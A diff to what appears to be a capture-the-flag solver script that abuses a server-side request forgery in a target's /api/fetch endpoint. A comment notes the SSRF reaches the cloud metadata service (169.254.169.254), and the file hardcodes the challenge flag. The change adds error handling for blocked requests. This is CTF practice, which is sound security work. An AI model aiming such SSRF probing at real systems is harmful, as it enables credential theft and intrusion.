@@ -23,7 +23,7 @@ publicly:
 
 Also note the SSRF reaches the cloud metadata service (169.254.169.254).
 """
-import json, urllib.request
+import json, urllib.request, urllib.error
 
 BASE = "http://54.72.82.22:8080"
 FLAG = "safctf{9f3a458f3a26e6372b5b5467e3e51edf}"
@@ -34,8 +34,11 @@ def fetch(url):
     req = urllib.request.Request(
         BASE + "/api/fetch", data=data, headers={"Content-Type": "application/json"}
     )
-    with urllib.request.urlopen(req, timeout=15) as r:
-        return json.loads(r.read().decode())
+    try:
+        with urllib.request.urlopen(req, timeout=15) as r:
+            return json.loads(r.read().decode())
+    except urllib.error.HTTPError as e:          # blocked URLs return 403
+        return json.loads(e.read().decode())
 
 
 def main():
